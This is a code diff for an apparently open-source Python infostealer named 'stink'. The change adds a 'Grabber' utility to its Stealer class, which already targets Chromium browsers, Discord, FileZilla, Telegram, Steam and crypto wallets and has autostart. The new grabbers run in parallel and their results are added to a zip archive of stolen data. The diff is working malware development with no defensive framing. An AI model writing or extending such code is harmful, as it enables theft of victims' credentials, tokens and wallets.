@@ -8,7 +8,7 @@ from multiprocessing import Pool
 from stink.enums import Features, Utils, Protectors
 from stink.helpers import functions, MemoryStorage
 from stink.helpers.config import MultistealerConfig, Browsers
-from stink.utils import Autostart, Message, Protector, Loader
+from stink.utils import Autostart, Message, Protector, Loader, Grabber
 from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam, Wallets
 
 
@@ -24,6 +24,7 @@ class Stealer(Thread):
         utils: List[Utils] = None,
         loaders: List[Loader] = None,
         protectors: List[Protectors] = None,
+        grabbers: List[Grabber] = None,
         delay: int = 0
     ):
         Thread.__init__(self, name="Stealer")
@@ -32,6 +33,11 @@ class Stealer(Thread):
             self.__loaders = []
         else:
             self.__loaders = loaders
+
+        if grabbers is None:
+            self.__grabbers = []
+        else:
+            self.__grabbers = grabbers
 
         if utils is None:
             utils = []
@@ -221,6 +227,16 @@ class Stealer(Thread):
                     (method["object"], method["arguments"]) for method in self.__methods if method["status"] is True
                 ])
             pool.close()
+
+            if self.__grabbers:
+
+                with Pool(processes=self.__config.PoolSize) as pool:
+                    grabber_results = pool.starmap(functions.run_process, [
+                        (grabber, None) for grabber in self.__grabbers
+                    ])
+                pool.close()
+
+                results += grabber_results
 
             data = self.__storage.create_zip([file for files in results if files for file in files])
 
